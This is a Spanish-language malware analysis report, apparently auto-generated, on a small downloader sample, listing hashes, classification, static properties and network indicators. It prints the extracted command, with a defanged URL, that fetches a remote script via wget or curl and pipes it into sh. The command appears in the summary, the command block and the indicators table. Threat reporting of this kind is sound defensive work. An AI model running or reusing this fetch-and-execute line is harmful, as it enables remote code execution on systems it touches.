# 🧬 Payload Analysis

`c987a80449bf77c3265ab0c38fc357d4e01c7aaa8c094a5d4d9ee82c327afcd2`

## 📌 Resumen

Texto ASCII de 374 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `sh` en `hxxps://14.46.136.XXX/sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `curl -sk hxxps://14.46.136.XXX/sh)`
2. `sh -s apache.selfr` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/c987a80449bf77c3265ab0c38fc357d4e01c7aaa8c094a5d4d9ee82c327afcd2.md](../../../../../malware-like/oraculo/downloader/c987a80449bf77c3265ab0c38fc357d4e01c7aaa8c094a5d4d9ee82c327afcd2.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T21:09:22.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `c987a80449bf77c3265ab0c38fc357d4e01c7aaa8c094a5d4d9ee82c327afcd2`
- **SHA1:** `925dd1ed98a4d07e3ec38118eb0cb2f051edab02`
- **MD5:** `1514de91dbd71242a042a7480fb9f360`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 374 B |
| Entropía | 5.13 |
| Strings | 9 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=6

## 🖥️ Comandos observados / extraídos

```text
echo (wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh || curl -sk hxxps://14.46.136.XXX/sh) | sh -s apache.selfr
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxps://14.46.136.XXX/sh | strings |
| url | hxxps://14.46.136.XXX/sh) | strings |
| ip | 14.46.136.XXX | static_analysis |
| ip | 190.179.166.XXX | static_analysis |
| command | echo (wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh \|\| curl -sk hxxps://14.46.136.XXX/sh) \| sh -s apache.selfr | strings |
| hash | c987a80449bf77c3265ab0c38fc357d4e01c7aaa8c094a5d4d9ee82c327afcd2 | static_analysis |
| ip | 107.167.94.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
